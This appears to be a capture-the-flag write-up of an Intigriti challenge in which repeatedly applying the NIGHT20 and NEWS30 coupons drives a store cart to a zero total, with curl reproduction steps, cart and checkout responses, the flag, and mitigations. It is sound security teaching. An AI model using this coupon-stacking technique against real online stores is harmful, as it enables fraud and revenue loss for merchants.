# Intigriti Challenge 1026 - Unlimited Coupon Stacking Leads to Zero-Cost Checkout

## Summary
Business Logic Error CWE-840 in the Halloween Store challenge allows unlimited stacking of promotional coupons on the same cart. By re-applying `NIGHT20` and `NEWS30` multiple times, the cumulative discount reaches 100% of the product price, enabling a free checkout of *The Midnight Collection* and disclosure of the challenge flag in the receipt.

## Target
- **URL:** https://challenge-1026.challenges.intigriti.io
- **Product:** `midnight-vault` - The Midnight Collection
- **Price:** 66600 cents
- **Store credit:** 6600 cents

## Vulnerability
The coupon application endpoint `/api/cart/coupon` does not enforce single-use per code and calculates each discount against the original subtotal. Discounts accumulate linearly:
```
total_discount = Σ count_i × percent_i × subtotal
```
No server-side validation prevents `total < 0` or `canCheckout` when discount equals subtotal.

## Reproduction

1. **Session**
```bash
curl -i https://challenge-1026.challenges.intigriti.io/api/session
# Save session cookie
```

2. **Add product**
```bash
curl -X POST https://challenge-1026.challenges.intigriti.io/api/cart/items \
  -H "Content-Type: application/json" \
  -H "Cookie: session=..." \
  -d '{"productId":"midnight-vault"}'
# subtotal: 66600, total: 66600
```

3. **Get newsletter code**
```bash
curl -X POST https://challenge-1026.challenges.intigriti.io/api/newsletter \
  -H "Content-Type: application/json" \
  -H "Cookie: session=..." \
  -d '{"email":"poc@example.com"}'
# code: NEWS30
```

4. **Stack coupons**
```bash
curl -X POST https://challenge-1026.challenges.intigriti.io/api/cart/coupon \
  -H "Content-Type: application/json" \
  -H "Cookie: session=..." \
  -d '{"code":"NIGHT20"}'

# Repeat NIGHT20 and NEWS30 twice each
```
Cart state after stacking:
```json
{
  "subtotal": 66600,
  "discount": 66600,
  "total": 0,
  "canCheckout": true,
  "promotions": [
    {"code":"NIGHT20","percent":20,"count":2,"amount":26640},
    {"code":"NEWS30","percent":30,"count":2,"amount":39960}
  ]
}
```

5. **Checkout**
```bash
curl -X POST https://challenge-1026.challenges.intigriti.io/api/checkout \
  -H "Content-Type: application/json" \
  -H "Cookie: session=..." \
  -d '{}'
```
Response:
```json
{
  "ok": true,
  "receipt": {
    "orderId": "BLE-628F806470",
    "paid": 0,
    "credit": 6600,
    "flag": "INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}"
  }
}
```

## Impact
- Free purchase of premium item
- Flag disclosure in receipt
- In production: revenue loss and promotional abuse

## Mitigation
- Enforce one-time use per coupon per cart/session
- Calculate discounts sequentially on remaining balance
- Validate `total >= 0` before checkout
- Cap cumulative discount at 100%

## Report
- Intigriti Report ID: INTIGRITI-IKQ5YG3Z
- Severity: Medium
- Status: Accepted